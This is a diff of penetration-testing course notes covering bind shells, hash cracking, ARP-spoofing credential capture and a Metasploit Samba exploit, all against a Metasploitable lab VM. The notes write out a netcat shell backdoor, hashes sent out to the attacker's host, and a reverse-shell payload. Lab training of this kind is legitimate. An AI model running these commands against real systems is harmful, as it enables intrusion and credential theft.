@@ -380,136 +380,178 @@ A single vulnerable service grants complete system control. Persistence mechanis
 
 Now confirm: can you run the SUID scan **on Metasploitable** and report the count? Then we proceed to Day 8.
 
+Excellent work. You've now exploited Samba using Metasploit, enumerated shares anonymously, and understood the payload ecosystem. Let me review and then we'll compile your Week 2 notes.
 
-📝 CONSOLIDATED COURSE NOTES: WEEK 2 (DAYS 8-11)
-═══════════════════════════════════
-WEEK 2: EXPLOITATION TECHNIQUES
-═══════════════════════════════════
-DAY 8 — BINDSHELL & BACKDOOR CREATION
-Concepts
-Bindshell: Victim listens on a port. Attacker connects to it. Firewall-unfriendly.
+---
 
-Reverse shell: Victim connects back to attacker. Firewall-friendly.
 
-Metasploitable has multiple intentional backdoors for training purposes.
+## 📊 ACCESS INVENTORY — CURRENT
 
-Access Methods Used
-bash
+| # | Method | Port | Access | Type | Encryption |
+|:--|:--|:--|:--|:--|:--|
+| 1 | vsftpd backdoor | 6200 | root | Bindshell (triggered) | None |
+| 2 | xinetd bindshell | 1524 | root | Bindshell (always-on) | None |
+| 3 | SSH (backdoor) | 22 | backdoor → su root | Legitimate service | Encrypted |
+| 4 | SSH (msfadmin) | 22 | msfadmin → sudo su | Legitimate service | Encrypted |
+| 5 | Telnet | 23 | msfadmin → sudo su | Legacy service | **None** |
+| 6 | Samba usermap | 139/445 | root | Remote exploit | Varies |
+
+**Six distinct paths to root.** Each exploits a different vulnerability or misconfiguration. This is the definition of a vulnerable system.
+
+---
+
+## 📝 CONSOLIDATED COURSE NOTES: WEEK 2 (DAYS 8-11)
+
+---
+
+### ═══════════════════════════════════
+### WEEK 2: EXPLOITATION TECHNIQUES
+### ═══════════════════════════════════
+
+---
+
+## DAY 8 — BINDSHELL & BACKDOOR CREATION
+
+### Concepts
+- **Bindshell:** Victim listens on a port. Attacker connects to it. Firewall-unfriendly.
+- **Reverse shell:** Victim connects back to attacker. Firewall-friendly.
+- Metasploitable has multiple intentional backdoors for training purposes.
+
+### Access Methods Used
+```bash
 nc 10.0.2.3 1524        # Pre-installed root bindshell via xinetd
 whoami                   # root
-Creating a Temporary Backdoor
-bash
+```
+
+### Creating a Temporary Backdoor
+```bash
 nc -lvp 7777 -e /bin/bash &   # On victim: listen and serve shell
 nc 10.0.2.3 7777               # From attacker: connect
 kill [PID]                     # Clean up
-System Investigation Commands
-bash
+```
+
+### System Investigation Commands
+```bash
 netstat -tulpn                     # All listening ports and processes
 ps aux | grep nc                   # Find netcat processes
 fuser -k 7777/tcp                  # Kill process on specific port
 cat /proc/[PID]/cmdline | tr '\0' ' '  # Exact launch command
-Key Discoveries
-Port 1524: xinetd bindshell (root access, no trigger needed)
+```
 
-Port 4444: Python mystery listener (likely Metasploit payload)
+### Key Discoveries
+- Port 1524: xinetd bindshell (root access, no trigger needed)
+- Port 4444: Python mystery listener (likely Metasploit payload)
+- Port 8787: Ruby HTTP/0.9 service
+- Port 2121: Second FTP server (ProFTPD)
+- Port 3632: DistCC daemon (known RCE vulnerability)
 
-Port 8787: Ruby HTTP/0.9 service
+### Key Takeaway
+Multiple backdoors provide redundancy. Internal enumeration (`netstat`) finds services external scans miss. Kill backdoors after use.
 
-Port 2121: Second FTP server (ProFTPD)
+---
 
-Port 3632: DistCC daemon (known RCE vulnerability)
+## DAY 9 — PASSWORD CRACKING
 
-Key Takeaway
-Multiple backdoors provide redundancy. Internal enumeration (netstat) finds services external scans miss. Kill backdoors after use.
+### Concepts
+- **Hashing ≠ Encryption:** Hashes are one-way. Cracking = guessing + comparing.
+- **Salt:** Random value added before hashing. Prevents rainbow table attacks.
+- **Hash algorithms:** `$1$` = MD5 (weak), `$6$` = SHA512 (strong), `$y$` = yescrypt (modern)
 
-DAY 9 — PASSWORD CRACKING
-Concepts
-Hashing ≠ Encryption: Hashes are one-way. Cracking = guessing + comparing.
-
-Salt: Random value added before hashing. Prevents rainbow table attacks.
-
-Hash algorithms: $1$ = MD5 (weak), $6$ = SHA512 (strong), $y$ = yescrypt (modern)
-
-Hash Format Breakdown
-text
+### Hash Format Breakdown
+```
 $1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
  └┬┘ └──┬──┘ └──────────┬──────────┘
   │     Salt            Hash
 MD5 crypt
-Cracking with John the Ripper
-bash
+```
+
+### Cracking with John the Ripper
+```bash
 echo 'msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/' > hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
 john --show hash.txt
-Hash Verification (Python)
-bash
+```
+
+### Hash Verification (Python)
+```bash
 python3 -c "from passlib.hash import md5_crypt; print(md5_crypt.hash('msfadmin', salt='XN10Zj2c'))"
-File Transfer via Netcat
-bash
+```
+
+### File Transfer via Netcat
+```bash
 # Receiver (Kali)
 nc -lvnp 4444 > receivedfile
 
 # Sender (Metasploitable)
 nc 10.0.2.15 4444 < all_hashes.txt
-Key Findings
-msfadmin password: msfadmin (default credential, verified cryptographically)
+```
 
-Root password hash also uses $1$ MD5 (weak)
+### Key Findings
+- msfadmin password: `msfadmin` (default credential, verified cryptographically)
+- Root password hash also uses `$1$` MD5 (weak)
+- Only one UID 0 account (root) — no hidden superusers
+- msfadmin has full sudo access: `(ALL) ALL`
 
-Only one UID 0 account (root) — no hidden superusers
-
-msfadmin has full sudo access: (ALL) ALL
-
-Key Takeaway
+### Key Takeaway
 Try default credentials before cracking. Verify hashes with Python before running John. Password reuse is the most common privilege escalation vector. Netcat transfers files across networks without FTP.
 
-DAY 10 — TELNET & CREDENTIAL SNIFFING
-Concepts
-Telnet (port 23): No encryption. Every character visible in packet capture.
+---
 
-SSH (port 22): Fully encrypted. TCP stream shows gibberish.
+## DAY 10 — TELNET & CREDENTIAL SNIFFING
 
-ARP Spoofing: Man-in-the-Middle attack that poisons ARP caches.
+### Concepts
+- **Telnet (port 23):** No encryption. Every character visible in packet capture.
+- **SSH (port 22):** Fully encrypted. TCP stream shows gibberish.
+- **ARP Spoofing:** Man-in-the-Middle attack that poisons ARP caches.
 
-ARP Spoofing Attack
-bash
+### ARP Spoofing Attack
+```bash
 sudo sysctl net.ipv4.ip_forward=1                    # Enable routing
 sudo arpspoof -i eth0 -t 10.0.2.3 10.0.2.2          # Poison victim
 sudo arpspoof -i eth0 -t 10.0.2.2 10.0.2.3          # Poison gateway
 sudo tcpdump -i eth0 port 23 -w capture.pcap          # Capture traffic
 sudo tcpdump -r capture.pcap -A | grep login          # Extract credentials
-Wireshark Credential Capture
-text
+```
+
+### Wireshark Credential Capture
+```
 Filter: host 10.0.2.3 and port 23
 Right-click → Follow → TCP Stream
 Result: metasploitable login: msfadmin
         Password: msfadmin
-Protocol Comparison
-Protocol	Port	Traffic Readable?
-Telnet	23	✅ Yes — Cleartext
-HTTP	80	✅ Yes — Cleartext
-FTP	21	✅ Yes — Cleartext
-SSH	22	❌ No — Encrypted
-HTTPS	443	❌ No — Encrypted
-Key Takeaway
+```
+
+### Protocol Comparison
+| Protocol | Port | Traffic Readable? |
+|:--|:--|:--|
+| Telnet | 23 | ✅ Yes — Cleartext |
+| HTTP | 80 | ✅ Yes — Cleartext |
+| FTP | 21 | ✅ Yes — Cleartext |
+| SSH | 22 | ❌ No — Encrypted |
+| HTTPS | 443 | ❌ No — Encrypted |
+
+### Key Takeaway
 Never use Telnet in production. ARP spoofing works on switched networks. SSH always encrypts traffic. If you can read credentials in a packet capture, the protocol is insecure.
 
-DAY 11 — SAMBA SMB EXPLOITATION
-Concepts
-Samba: Linux implementation of Windows SMB protocol (ports 139/445)
+---
 
-CVE-2007-2447: Username map script command injection in Samba 3.0.x
+## DAY 11 — SAMBA SMB EXPLOITATION
 
-Anonymous shares: World-readable/writable shares without authentication
+### Concepts
+- **Samba:** Linux implementation of Windows SMB protocol (ports 139/445)
+- **CVE-2007-2447:** Username map script command injection in Samba 3.0.x
+- **Anonymous shares:** World-readable/writable shares without authentication
 
-Samba Enumeration
-bash
+### Samba Enumeration
+```bash
 smbclient -L //10.0.2.3 -N          # List shares (anonymous)
 smbclient //10.0.2.3/tmp -N         # Connect to share
 enum4linux 10.0.2.3                  # Comprehensive enumeration
-Metasploit Exploitation
-bash
+```
+
+### Metasploit Exploitation
+```bash
 msfconsole
 search samba usermap
 use exploit/multi/samba/usermap_script
@@ -517,25 +559,29 @@ set RHOSTS 10.0.2.3
 set LHOST 10.0.2.15
 set PAYLOAD cmd/unix/reverse_netcat
 exploit
-Payload Types
-Payload Type	Direction	Use Case
-bind_*	Attacker → Victim	Victim accepts inbound connections
-reverse_*	Victim → Attacker	Victim behind firewall/NAT
-adduser	N/A	Persistence, not just a shell
-Key Findings
-Samba 3.0.20-Debian is vulnerable to CVE-2007-2447
+```
 
-tmp share is anonymously accessible with write permission
+### Payload Types
+| Payload Type | Direction | Use Case |
+|:--|:--|:--|
+| `bind_*` | Attacker → Victim | Victim accepts inbound connections |
+| `reverse_*` | Victim → Attacker | Victim behind firewall/NAT |
+| `adduser` | N/A | Persistence, not just a shell |
 
-opt share contains installed software (potential malware staging)
+### Key Findings
+- Samba 3.0.20-Debian is vulnerable to CVE-2007-2447
+- `tmp` share is anonymously accessible with write permission
+- `opt` share contains installed software (potential malware staging)
+- enum4linux reveals domain information and usernames
 
-enum4linux reveals domain information and usernames
-
-Key Takeaway
+### Key Takeaway
 SMB attacks are the backbone of enterprise network compromise. Anonymous shares are data exfiltration points. Metasploit is a force multiplier—understand the vulnerability, then use the framework.
 
-🔴 KILL CHAIN STATUS: END OF WEEK 2
-text
+---
+
+## 🔴 KILL CHAIN STATUS: END OF WEEK 2
+
+```
 [████████████████████████████████░░░░░░░░] 60%
 
 ✅ Reconnaissance      — Complete service and directory map
@@ -546,16 +592,29 @@ text
 ⬜ Lateral Movement     — No additional targets yet
 ⬜ Web App Attacks      — Mutillidae, phpMyAdmin, DVWA identified but not attacked
 ⬜ Exfiltration        — Netcat file transfer tested, not fully exploited
-🗓️ WEEK 3 PREVIEW
-Day	Topic	What You'll Do
-12	Web App Attacks I — SQL Injection	Break into Mutillidae's database using SQL injection
-13	Web App Attacks II — Command Injection & XSS	Execute system commands through web forms
-14	Web App Attacks III — File Inclusion	Read system files and execute code via LFI/RFI
-15	UnrealIRCd Backdoor	Exploit the IRC daemon backdoor (port 6667)
-16	MySQL & PostgreSQL	Database access, credential extraction, UDF escalation
-17	VNC Attack	Crack or bypass VNC authentication
-18	Week 3 Review & Attack Playbook	Document all 10+ access methods
-Your Week 2 notes are complete. Save this document.
+```
+
+---
+
+## 🗓️ WEEK 3 PREVIEW
+
+| Day | Topic | What You'll Do |
+|:--|:--|:--|
+| **12** | Web App Attacks I — SQL Injection | Break into Mutillidae's database using SQL injection |
+| **13** | Web App Attacks II — Command Injection & XSS | Execute system commands through web forms |
+| **14** | Web App Attacks III — File Inclusion | Read system files and execute code via LFI/RFI |
+| **15** | UnrealIRCd Backdoor | Exploit the IRC daemon backdoor (port 6667) |
+| **16** | MySQL & PostgreSQL | Database access, credential extraction, UDF escalation |
+| **17** | VNC Attack | Crack or bypass VNC authentication |
+| **18** | Week 3 Review & Attack Playbook | Document all 10+ access methods |
+
+---
+
+**Your Week 2 notes are complete. Save this document.**
+
+You've moved from reconnaissance to exploitation. Six different root access methods. Command-line comfort is becoming second nature. Next week, you attack the web layer.
+
+**Ready for Day 12? Confirm and we proceed to SQL Injection.**
 
 You've moved from reconnaissance to exploitation. Six different root access methods. Command-line comfort is becoming second nature. Next week, you attack the web layer.
 
